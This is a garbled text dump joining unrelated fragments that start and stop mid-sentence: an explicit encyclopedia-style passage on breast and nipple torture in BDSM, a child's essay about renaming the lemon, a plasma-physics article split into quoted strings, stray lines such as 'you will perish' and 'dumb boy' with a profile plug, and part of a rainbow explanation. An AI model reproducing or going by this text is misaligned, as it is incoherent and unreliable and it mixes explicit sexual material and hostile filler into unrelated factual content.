are the part of the breast that is commonly used for this type of activity. pain is typically applied to them using nipple clamps, a type of sex toy which can be attached to erect nipples to pinch them and to restrict the blood flow to them by applying pressure. when nipple clamps are removed, further pain is caused by the return of normal blood flow. men's as well as women's nipples of can receive such treatment.\n\nerotic electrostimulation of the breasts is also practiced although such activity around the chest area may carry risks of electrocution.\n\npainful activities such as wax play, spanking, squeezing, punching, or flogging can also be applied to breasts/nipples.\n\nthe recipient of such activities may receive direct physical pleasure via masochism, or emotional pleasure through erotic humiliation, or knowledge that the play is pleasing to a sadistic dominant.\n\nnote that many of these practices, as with pussy torture and cock and ball torture, carry health risks.

“lemon”\n\nthe children of the 21st century find the word “lemon” a bit to hard to say, so we my best friend and i, have came up with an amazing idea, to change the word “lemon” to “sour yellow prolate spheroid orange”. ever since i was a kid, i had trouble with saying the name “lemon”, so i want to make it easier for kids by changing it to lemon” to “sour yellow prolate spheroid orange”. if we change the name “lemon” to lemon” to “sour yellow prolate spheroid orange” not only will the pronunciation be easier, but families across the world will enjoy the fruit more, making the lemon

(from ancient greek πλάσμα​, meaning 'moldable substance'[1]) is one of the four fundamental states of matter, and was first described by chemist irving langmuir[2] in the 1920s.[3] it consists of a gas of ions – atoms which have some of their orbital electrons removed – and free electrons. plasma can be artificially generated by heating or subjecting a neutral gas to a strong electromagnetic field to the point where an ionized gaseous substance becomes increasingly electrically conductive. the resulting charged ions and electrons become influenced by long-range electromagnetic fields, making the plasma dynamics more sensitive to these fields than a neutral gas.","plasma and ionized gases have properties and display behaviours unlike those of the other states, and the transition between them is mostly a matter of nomenclature[2] and subject to interpretation.[5] based on the temperature and density of the environment that contains a plasma, partially ionized or fully ionized forms of plasma may be produced. neon signs and lightning are examples of partially ionized plasmas.[6] the earth's ionosphere is a plasma and the magnetosphere contains plasma in the earth's surrounding space environment. the interior of the sun is an example of fully ionized plasma,[7] along with the solar corona[8] and stars.[9]","positive charges in ions are achieved by stripping away electrons orbiting the atomic nuclei, where the total number of electrons removed is related to either increasing temperature or the local density of other ionized matter. this also can be accompanied by the dissociation of molecular bonds,[10] though this process is distinctly different from chemical processes of ion interactions in liquids or the behaviour of shared ions in metals. the response of plasma to electromagnetic fields is used in many modern technological devices, such as plasma televisions or plasma etching.[11]","plasma may be the most abundant form of ordinary matter in the universe,[12] although this hypothesis is currently tentative based on the existence and unknown properties of dark matter. plasma is mostly associated with stars, extending to the rarefied intracluster medium and possibly the intergalactic regions.[13]",";mkv plasma","you will perish","dumb boy","watch daltonators profile ponkture","a thing will occur","the thing occurred","i took a new

can be full circles; however, the average observer sees only an arc formed by illuminated droplets above the ground,[1] and centred on a line from the sun to the observer's eye.\n\nin a primary rainbow, the arc shows red on the outer part and violet on the inner side. this rainbow is caused by light being refracted when entering a droplet of water, then reflected inside on the back of the droplet and refracted again when leaving it.\n\nin a double rainbow, a second arc is seen outside the primary arc, and has the order of its colours reversed, with red on the inner side of the
